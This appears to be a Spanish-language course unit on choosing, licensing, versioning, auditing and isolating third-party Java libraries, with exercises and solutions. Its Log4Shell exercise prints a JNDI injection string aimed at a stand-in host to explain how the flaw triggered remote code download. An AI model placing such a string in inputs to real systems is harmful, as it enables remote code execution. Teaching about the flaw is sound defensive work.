# Librerías: incorporar funcionalidad ajena

El criterio *e)* pide *«utilizar librerías de código y frameworks para incorporar funcionalidades específicas»*. Es lo que llevas haciendo desde la UT4 sin pensarlo: Spring, Jackson, Hibernate, JUnit.

Lo nuevo aquí es hacerlo **con criterio**: saber elegir, saber qué estás metiendo en tu proyecto y saber cuándo no meterlo.

## 1. Elegir una librería

Un `implementation 'loquesea'` parece gratis. No lo es: acabas de firmar un compromiso de mantenimiento. Antes de firmarlo, cinco preguntas.

| Pregunta | Dónde se mira | Mala señal |
|---|---|---|
| ¿Está viva? | Último *release*, últimos *commits* | Dos años sin tocar |
| ¿La usa gente? | Descargas en Maven Central, estrellas | Cuatro descargas al mes |
| ¿Qué licencia tiene? | El fichero `LICENSE` | GPL en producto propietario |
| ¿Cuánto arrastra? | `mvn dependency:tree` | 40 dependencias transitivas para formatear una fecha |
| ¿Tiene fallos conocidos? | `mvn dependency-check` | CVE críticos sin parchear |

!!! tip "La regla del tamaño"
    Para algo pequeño —formatear, validar un DNI, hacer un *slug*— muchas veces es mejor escribir veinte líneas propias que meter una dependencia.

    Para algo grande —generar PDF, leer Excel, criptografía— **jamás** lo escribas tú. Una librería madura ha resuelto cien casos límite que ni imaginas, y en criptografía además es peligroso intentarlo.

## 2. Licencias: lo que sí importa

| Licencia | Puedes usarla en producto cerrado | Obligación |
|---|:-:|---|
| **MIT**, **Apache 2.0**, **BSD** | :material-check: | Citar el aviso de copyright |
| **LGPL** | :material-check: (si enlazas dinámicamente) | Publicar cambios en la librería |
| **GPL**, **AGPL** | :material-close: | Publicar **tu** código |
| Sin licencia | :material-close: | Sin licencia = todos los derechos reservados |

La AGPL es la más agresiva y la que más pilla por sorpresa: se activa **también si el software se usa por red**, no solo si se distribuye. Una aplicación web que use una librería AGPL puede estar obligada a publicar su código.

!!! warning "«Sin licencia» no significa libre"
    Un repositorio de GitHub sin fichero `LICENSE` es, legalmente, **código propietario**. Que esté publicado no da permiso para usarlo.

## 3. Versiones: qué significan los números

**SemVer**, `MAYOR.MENOR.PARCHE`:

- **PARCHE** (`1.4.2 → 1.4.3`): solo correcciones. Actualiza sin miedo.
- **MENOR** (`1.4.2 → 1.5.0`): funciones nuevas, compatible. Actualiza y prueba.
- **MAYOR** (`1.4.2 → 2.0.0`): **rompe cosas**. Lee las notas antes.

En Maven, las versiones se gestionan en un solo sitio:

```xml title="pom.xml"
<properties>
    <itext.version>8.0.5</itext.version>
</properties>
```

Y con Spring Boot, lo mejor es **no poner versión** en las dependencias que él ya gestiona: su `parent` fija combinaciones probadas entre sí. Poner una versión a mano es la forma más rápida de romper un proyecto que funcionaba.

## 4. Seguridad de las dependencias

Tu proyecto no tiene 20 dependencias: tiene 20 directas y unas 200 transitivas. Cualquiera de las 220 puede tener un agujero.

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <executions><execution><goals><goal>check</goal></goals></execution></executions>
</plugin>
```

```bash
mvn dependency-check:check      # informe de vulnerabilidades conocidas
mvn dependency:tree             # de dónde sale cada cosa
mvn versions:display-dependency-updates
```

!!! danger "Log4Shell, diciembre de 2021"
    Una vulnerabilidad en Log4j —una librería de logs presente en prácticamente todo el ecosistema Java— permitía **ejecutar código remoto** escribiendo una cadena en cualquier campo que acabara en un log. Un nombre de usuario, un `User-Agent`.

    Millones de aplicaciones afectadas, y la mayoría de los equipos ni sabía que tenía Log4j: venía de tercera mano. La lección: **conoce tu árbol de dependencias**.

## 5. Cuatro librerías útiles y por qué

Las que se usan en el proyecto de aula, con lo mínimo para arrancar.

### PDF con OpenPDF

```xml title="pom.xml"
<dependency>
    <groupId>com.github.librepdf</groupId>
    <artifactId>openpdf</artifactId>
    <version>2.0.3</version>
</dependency>
```

```java
public byte[] fichaComercio(Comercio c) {
    var salida = new ByteArrayOutputStream();
    var doc = new Document(PageSize.A4);
    PdfWriter.getInstance(doc, salida);
    doc.open();
    doc.add(new Paragraph(c.getNombre(), FontFactory.getFont(FontFactory.HELVETICA_BOLD, 18)));
    doc.add(new Paragraph(c.getDireccion()));
    doc.close();
    return salida.toByteArray();
}
```

```java
@GetMapping(value = "/comercios/{id}/ficha.pdf", produces = MediaType.APPLICATION_PDF_VALUE)
public ResponseEntity<byte[]> ficha(@PathVariable Long id) {
    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=ficha.pdf")
        .body(pdfServicio.fichaComercio(servicio.porId(id)));
}
```

!!! note "OpenPDF y no iText"
    iText 5 era LGPL; **iText 7 es AGPL** y exige licencia comercial para producto cerrado. OpenPDF es la bifurcación que se quedó en LGPL/MPL.

    Es un ejemplo perfecto del apartado anterior: dos librerías casi idénticas, consecuencias legales opuestas.

### Excel con Apache POI

```java
try (var libro = new XSSFWorkbook()) {
    var hoja = libro.createSheet("Comercios");
    var cab = hoja.createRow(0);
    cab.createCell(0).setCellValue("Nombre");
    cab.createCell(1).setCellValue("Actividad");

    int f = 1;
    for (var c : comercios) {
        var fila = hoja.createRow(f++);
        fila.createCell(0).setCellValue(c.getNombre());
        fila.createCell(1).setCellValue(c.getActividad().name());
    }
    libro.write(salida);
}
```

Sirve también para **leer**: muchos portales públicos publican en `.xlsx` en vez de CSV, y entonces POI es la única entrada.

### Códigos QR con ZXing

```java
public byte[] qr(String texto, int tam) throws Exception {
    var matriz = new QRCodeWriter().encode(texto, BarcodeFormat.QR_CODE, tam, tam);
    var salida = new ByteArrayOutputStream();
    MatrixToImageWriter.writeToStream(matriz, "PNG", salida);
    return salida.toByteArray();
}
```

Treinta líneas frente a implementar el estándar QR: el ejemplo perfecto de cuándo no reinventar.

### Mapas con Leaflet

No es una librería Java: es JavaScript, y encaja con lo que aprendiste en la UT8.

```html
<div id="mapa" style="height:400px"></div>
<script th:inline="javascript">
  const puntos = /*[[${puntos}]]*/ [];
  const mapa = L.map('mapa').setView([40.4168, -3.7038], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
              {attribution: '© OpenStreetMap'}).addTo(mapa);
  puntos.forEach(p => L.marker([p.lat, p.lon]).addTo(mapa).bindPopup(p.nombre));
</script>
```

Ese `/*[[${puntos}]]*/` es la **inserción de datos de Thymeleaf en JavaScript**, y serializa la lista a JSON correctamente escapado. Escribirlo concatenando cadenas es una vía directa a un XSS.

Y fíjate en el `attribution`: OpenStreetMap **exige citar la fuente**. Quitarlo incumple la licencia.

## 6. Aislar la librería detrás de una interfaz tuya

La lección de arquitectura de la unidad, y la que se mira en el examen:

```java
public interface GeneradorPdf {
    byte[] ficha(Comercio c);
}

@Service
class GeneradorPdfOpenPdf implements GeneradorPdf { … }
```

El resto de tu código depende de `GeneradorPdf`, no de OpenPDF. Cuando dentro de tres años cambies de librería —porque la abandonan, porque cambia de licencia o porque encuentras una mejor—, tocas **una clase**.

Es exactamente el mismo razonamiento por el que en la UT4 el servicio dependía de la interfaz del repositorio, y por el que en la UT5 pudiste cambiar memoria por JPA sin tocar nada. **Las dependencias externas se tratan como detalles, igual que la base de datos.**

## Pruébalo ahora (15 min)

!!! reto "Trabaja tú ahora"
    Este bloque se hace **en clase, en tu equipo**. No se entrega ni puntúa: es la práctica que hace que el examen te salga.

Audita las dependencias de un proyecto tuyo. Son cuatro órdenes y sorprenden.

```bash
# 1. El árbol completo: lo que has pedido y lo que ha venido detrás
mvn dependency:tree

# 2. Solo lo que arrastra spring-boot-starter-web
mvn dependency:tree -Dincludes=org.springframework.boot:spring-boot-starter-web

# 3. Lo que está en el classpath y NO usas, y lo que usas sin declarar
mvn dependency:analyze

# 4. Vulnerabilidades conocidas (la primera vez tarda: se baja la base de datos)
mvn org.owasp:dependency-check-maven:check
```

=== "Maven"

    ```bash
    mvn dependency:tree
    mvn dependency:analyze
    mvn versions:display-dependency-updates
    mvn org.owasp:dependency-check-maven:check
    ```

=== "Gradle"

    ```bash
    gradle dependencies --configuration runtimeClasspath
    gradle dependencyInsight --dependency jackson-databind
    gradle dependencyUpdates          # con el plugin ben-manes
    gradle dependencyCheckAnalyze     # con el plugin de OWASP
    ```

Tres preguntas a las que responder mirando la salida:

1. **¿Cuántas dependencias tiene tu proyecto?** Cuenta las que declaraste tú, y luego las que salen en el árbol. La diferencia suele ser de veinte a uno.
2. **Busca `jackson-databind` en el árbol.** ¿Lo declaraste tú? ¿Quién lo mete y en qué versión?
3. Abre el informe de `dependency-check` en `target/dependency-check-report.html`. **¿Hay algo en rojo?**

---

## Ejercicios (con solución)

### Ejercicio 1 — Cinco preguntas antes de añadir una dependencia

??? success "Solución"

    1. **¿La necesito de verdad, o me la escribo en veinte líneas?** Formatear una fecha no justifica una librería; generar un PDF, sí.
    2. **¿Está viva?** Último *commit*, último *release*, incidencias abiertas sin responder. Una librería sin movimiento en dos años es una vulnerabilidad esperando.
    3. **¿Qué licencia tiene?** Y sobre todo: ¿es compatible con lo que vas a hacer con tu aplicación?
    4. **¿Qué arrastra?** Una librería «pequeña» puede meter quince dependencias transitivas y chocar con las versiones que ya tienes.
    5. **¿Cuánta gente la usa?** Descargas, estrellas, si aparece en proyectos conocidos. No es un concurso de popularidad: es la probabilidad de encontrar respuesta cuando falle.

    Y la sexta, la que se olvida: **¿puedo salir de ella?** Si mañana la abandonan, ¿cuánto código mío hay que tocar? Es lo que resuelve aislarla tras una interfaz tuya.

### Ejercicio 2 — AGPL en una aplicación web

¿Por qué no puedes usar una librería AGPL en una aplicación web propietaria?

??? success "Solución"

    Porque la AGPL cierra justo el resquicio que la GPL dejaba abierto.

    La GPL obliga a publicar el código solo si **distribuyes** el programa. Una aplicación web no se distribuye: se ejecuta en tu servidor y el usuario solo recibe HTML. Con GPL, no estarías obligado a publicar nada.

    La AGPL añade que **ofrecer el servicio por la red cuenta como distribuir**. Si tu web usa una librería AGPL, cualquier usuario puede exigirte el código fuente de **toda tu aplicación**.

    | Licencia | Puedes usarla en una web propietaria |
    |---|---|
    | Apache 2.0, MIT, BSD | **Sí**, sin condiciones prácticas |
    | LGPL | **Sí**, si la enlazas sin modificarla |
    | GPL | **Sí** para una web, pero cuidado si distribuyes |
    | **AGPL** | **No**, salvo que publiques tu código |

    No es un tecnicismo: es el motivo por el que muchas empresas prohíben la AGPL en su lista de licencias permitidas.

### Ejercicio 3 — Un repositorio sin `LICENSE`

¿Puedes usarlo?

??? success "Solución"

    **No.** Que el código esté a la vista no significa que puedas usarlo.

    Por defecto, toda obra está protegida por derechos de autor desde que se crea. Sin licencia, el autor **no te ha dado ningún permiso**: ni copiar, ni modificar, ni distribuir. Que sea público solo significa que puedes leerlo.

    Es el escenario contrario al que la gente supone: la ausencia de licencia no es «todos los derechos cedidos», es **todos los derechos reservados**.

    Qué hacer:

    1. **Preguntar al autor.** Una incidencia pidiendo que añada una licencia. Muchas veces es un olvido y la ponen en un día.
    2. **Buscar otra** que sí la tenga.
    3. **Escribirlo tú**, inspirándote en la idea pero sin copiar el código.

    Ojo con los términos de servicio de GitHub: permiten ver y bifurcar dentro de la plataforma, pero **no dan permiso de uso en tus proyectos**.

### Ejercicio 4 — De `2.4.1` a `3.0.0`

¿Qué significa y qué haces antes de actualizar?

??? success "Solución"

    Es un salto de **versión mayor**, y en versionado semántico (`MAYOR.MENOR.PARCHE`) eso significa una cosa concreta: **hay cambios que rompen la compatibilidad**. Métodos que desaparecen, firmas que cambian, comportamientos distintos.

    | Salto | Qué significa | Riesgo |
    |---|---|---|
    | `2.4.1` → `2.4.2` | Corrección de fallos | Ninguno. Actualiza |
    | `2.4.1` → `2.5.0` | Funcionalidad nueva, compatible | Bajo |
    | `2.4.1` → `3.0.0` | **Rompe** | Alto. Requiere trabajo |

    Antes de dar el salto:

    1. **Leer las notas de la versión y la guía de migración.** Las librerías serias publican una.
    2. **Comprobar que tus tests están en verde antes de tocar nada.** Sin red de seguridad, actualizar es a ciegas.
    3. **Hacerlo en una rama**, y solo esa dependencia.
    4. **Mirar qué más arrastra**, con `mvn dependency:tree`. Una mayor suele traer transitivas nuevas.

    Y en un proyecto Spring Boot, la mayoría de versiones **no las eliges tú**: las fija el `parent`. Subir la versión de Spring Boot sube docenas a la vez, y por eso es la actualización que más se prepara.

### Ejercicio 5 — Log4Shell

Explica qué fue y qué lección deja.

??? success "Solución"

    En diciembre de 2021 se descubrió que **Log4j 2**, la librería de registro más usada del mundo Java, interpretaba expresiones dentro de los mensajes que escribía. Un texto como `${jndi:ldap://malo.example/x}` hacía que el servidor **se descargara y ejecutara código** de una dirección ajena.

    Lo devastador era lo fácil que se disparaba: bastaba que ese texto llegara a cualquier sitio que se registrara. Un nombre de usuario. Una cabecera `User-Agent`. El asunto de un correo.

    Las lecciones:

    1. **Tú no controlas tu código: controlas tu árbol de dependencias.** Casi nadie había puesto Log4j a mano; venía debajo de otra cosa.
    2. **Hace falta saber qué tienes.** El primer día, la mayoría de empresas no sabía si estaba afectada, y averiguarlo les costó más que arreglarlo. De ahí viene la exigencia de un inventario de dependencias.
    3. **Analizar dependencias tiene que estar en la construcción**, no ser algo que uno recuerda hacer:

       ```bash
       mvn org.owasp:dependency-check-maven:check
       ```

    4. **Una librería sin mantenimiento es un riesgo**, aunque hoy funcione. Log4j se arregló en horas porque tenía comunidad detrás.

### Ejercicio 6 — OpenPDF y no iText 7

??? success "Solución"

    Por la **licencia**, no por lo técnico.

    - **iText 5** era LGPL/MPL. A partir de **iText 7** pasó a **AGPL**, o licencia comercial de pago.
    - **OpenPDF** es una bifurcación de iText 4, que se quedó en **LGPL/MPL**.

    Como viste en el ejercicio 2, usar AGPL en una web propietaria te obliga a publicar el código de toda la aplicación. Para un ejercicio de clase da igual; para lo que vas a hacer en una empresa, no.

    Es el ejemplo perfecto de por qué la licencia se mira **antes** que la API: iText 7 es mejor librería, y aun así no la puedes usar.

    Y hay otra lección: **una librería puede cambiar de licencia entre versiones**. Que la 5 fuera libre no significa que la 7 lo sea. Se revisa en cada actualización mayor.

### Ejercicio 7 — Escribirlo o meter una librería

¿Cuál es el criterio?

??? success "Solución"

    Compara **el coste de escribirlo** con el coste de la dependencia, que no es solo añadir una línea al `pom.xml`: es actualizarla, vigilar sus vulnerabilidades, cargar con lo que arrastre y depender de que siga viva.

    | Escríbelo tú | Mete la librería |
    |---|---|
    | Cabe en 50 líneas y lo entiendes entero | Es un formato o un protocolo complejo (PDF, Excel, QR) |
    | Es lógica de **tu** negocio | Es un problema resuelto mil veces |
    | La librería trae 200 clases y usas una | Hacerlo bien exige criptografía o normas |
    | Es fácil equivocarse poco | **Es fácil equivocarse mucho**: seguridad, fechas, codificaciones |

    Las dos reglas que zanjan la mayoría de casos:

    - **Nunca escribas tú criptografía**, ni hashes de contraseña, ni validación de certificados. Aquí un fallo no se ve y es grave.
    - **Formatear una fecha o validar un correo no justifica una dependencia.** `DateTimeFormatter` y una anotación `@Email` ya vienen contigo.

### Ejercicio 8 — Aislar la librería de PDF

¿Cómo lo harías para poder cambiarla mañana?

??? success "Solución"

    Con una **interfaz tuya** que la aplicación usa, y una implementación que es lo único que conoce la librería.

    ```java title="Tu contrato: no menciona ninguna librería"
    public interface GeneradorInformes {
        byte[] informeDeComercios(List<ComercioDto> comercios, String titulo);
    }
    ```

    ```java title="La única clase que importa OpenPDF"
    @Service
    class GeneradorOpenPdf implements GeneradorInformes {
        @Override
        public byte[] informeDeComercios(List<ComercioDto> comercios, String titulo) {
            // aquí, y SOLO aquí, com.lowagie.text.*
        }
    }
    ```

    El controlador depende de la interfaz:

    ```java
    private final GeneradorInformes generador;   // no sabe que existe OpenPDF
    ```

    Lo que se gana:

    - **Cambiar de librería es escribir otra implementación.** El resto del proyecto no se toca.
    - **Se puede probar sin generar PDF**: un doble de la interfaz y listo.
    - **Los tipos ajenos no se escapan.** Si `Document` o `PdfWriter` aparecen en las firmas de tu servicio, la librería ya está metida hasta el fondo aunque creas que está aislada.

    La señal de que lo has hecho mal: buscas `import com.lowagie` en el proyecto y sale en más de un fichero.
